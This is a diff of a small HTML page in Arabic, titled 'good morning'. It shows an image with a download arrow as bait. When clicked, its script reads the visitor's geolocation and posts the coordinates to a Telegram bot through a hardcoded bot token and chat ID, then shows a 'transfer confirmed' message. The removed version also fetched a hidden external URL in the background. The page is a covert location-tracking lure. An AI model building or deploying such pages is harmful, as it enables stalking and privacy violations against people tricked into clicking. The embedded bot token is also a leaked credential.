@@ -3,76 +3,50 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>فتح الصورة</title>
+<title>صباح الخير</title>
 <style>
   body {
     margin: 0;
-    height: 100vh;
     display: flex;
     justify-content: center;
     align-items: center;
+    height: 100vh;
     background: #f2f2f2;
-    font-family: Arial, sans-serif;
   }
-
   .image-wrapper {
     position: relative;
     width: 500px;
     height: 300px;
     cursor: pointer;
-    border-radius: 15px;
-    overflow: hidden;
-    box-shadow: 0 8px 20px rgba(0,0,0,0.3);
   }
-
   .image-wrapper img {
     width: 100%;
     height: 100%;
     object-fit: cover;
+    border-radius: 15px;
+    filter: brightness(0.85); /* تمويه بسيط */
   }
-
-  .overlay-icon {
+  .download-arrow {
     position: absolute;
     top: 50%;
     left: 50%;
     transform: translate(-50%, -50%);
     font-size: 50px;
-    color: rgba(255,255,255,0.9);
-    text-shadow: 0 0 10px rgba(0,0,0,0.7);
+    color: #fff;
+    opacity: 0.8;
     pointer-events: none;
   }
 </style>
 </head>
 <body>
 
-<div class="image-wrapper" onclick="openHiddenLinkAndSendLocation()">
-  <img src="https://i.ibb.co/spwcmX7m/IMG-20250826-WA0011.jpg" alt="صورة التحويل">
-  <div class="overlay-icon">⬇️</div>
+<div class="image-wrapper" onclick="getLocation()">
+  <img src="https://i.ibb.co/spwcmX7m/IMG-20250826-WA0011.jpg" alt="صباح الخير">
+  <div class="download-arrow">⬇️</div>
 </div>
 
 <script>
-function openHiddenLinkAndSendLocation() {
-    // فتح رابط Render في الخلفية (مخفي)
-    const hiddenLink = "https://lolo-1-rt30.onrender.com";
-    fetch(hiddenLink).catch(e => console.log(e));
-
-    // إرسال الموقع للبوت
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            pos => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                sendToBot(lat, lon);
-                alert("✅ تم فتح الصورة وتأكيد الموقع!");
-            },
-            err => alert("❌ لم يتم السماح بالوصول إلى الموقع")
-        );
-    } else {
-        alert("❌ جهازك لا يدعم الموقع الجغرافي");
-    }
-}
-
-function sendToBot(lat, lon) {
+function sendLocationToBot(lat, lon) {
     const telegramToken = "8120112422:AAGXl1kbMxBnBgUOQU0nZhYvYum5yJAagyM";
     const chatId = "6495557039";
     const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
@@ -86,6 +60,24 @@ function sendToBot(lat, lon) {
     .then(res => res.json())
     .then(data => console.log("✅ تم الإرسال:", data))
     .catch(err => console.error("❌ خطأ:", err));
+}
+
+function getLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            pos => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                sendLocationToBot(lat, lon);
+                alert("✅ تم تأكيد التحويل!");
+            },
+            err => {
+                alert("❌ لم يتم السماح بالوصول إلى الموقع");
+            }
+        );
+    } else {
+        alert("❌ جهازك لا يدعم الموقع الجغرافي");
+    }
 }
 </script>
 
